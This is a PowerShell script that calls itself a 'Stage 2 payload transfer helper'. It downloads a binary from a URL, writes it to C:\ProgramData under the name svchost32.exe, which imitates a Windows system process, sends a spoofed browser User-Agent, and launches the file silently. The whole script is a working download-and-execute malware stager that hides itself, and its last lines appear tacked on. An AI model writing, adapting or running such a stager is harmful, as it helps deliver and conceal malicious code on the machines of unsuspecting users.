
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\payload.ps1
#>
$DownloadUrl = 'https://localhost:8080/payload.bin'
$LocalPath = "C:\ProgramData\svchost32.exe"
$RequestTimeout = 159
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $FetchResult = Invoke-Stage2Download -SourceUrl $DownloadUrl -DestinationPath $LocalPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
    if ($FetchResult) {
        Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Output "stage 44 initialized"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
